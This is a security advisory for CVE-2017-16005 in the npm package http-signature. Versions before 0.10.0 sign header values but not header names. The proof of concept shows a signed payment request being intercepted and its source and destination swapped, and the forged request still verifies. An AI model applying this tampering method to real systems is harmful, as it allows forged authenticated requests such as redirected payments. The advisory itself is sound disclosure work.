# [H] Header Forgery in http-signature

## Summary
Severity: High
Advisory: GHSA-q257-vv4p-fg92
CVE: CVE-2017-16005
CWE: CWE-20
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2018-11-09
Source: https://github.com/advisories/GHSA-q257-vv4p-fg92
Type: github-advisory

## Affected
- npm: `http-signature` — affected >=0 <0.10.0

## Details
Affected versions of `http-signature` contain a vulnerability which can allow an attacker in a privileged network position to modify header names and change the meaning of the request, without requiring an updated signature. 

This problem occurs because vulnerable versions of `http-signature` sign the contents of headers, but not the header names.

## Proof of Concept

Consider this to be the initial, untampered request:
```http
POST /pay HTTP/1.1
Host: example.com
Date: Thu, 05 Jan 2012 21:31:40 GMT
X-Payment-Source: src@money.com
X-Payment-Destination: dst@money.com
Authorization: Signature keyId="Test",algorithm="rsa-sha256",headers="x-payment-source x-payment-destination" MDyO5tSvin5...
```

And the request is intercepted and tampered as follows:
```http
X-Payment-Source: dst@money.com // Emails switched
X-Payment-Destination: src@money.com
Authorization: Signature keyId="Test",algorithm="rsa-sha256",headers="x-payment-destination x-payment-source" MDyO5tSvin5...
```

In the resulting responses, both requests would pass signature verification without issue.
```
src@money.com\n
dst@money.com\n
```



## Recommendation

Update to version 0.10.0 or higher.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-16005
- https://github.com/joyent/node-http-signature/issues/10
- https://github.com/advisories/GHSA-q257-vv4p-fg92
- https://www.npmjs.com/advisories/318
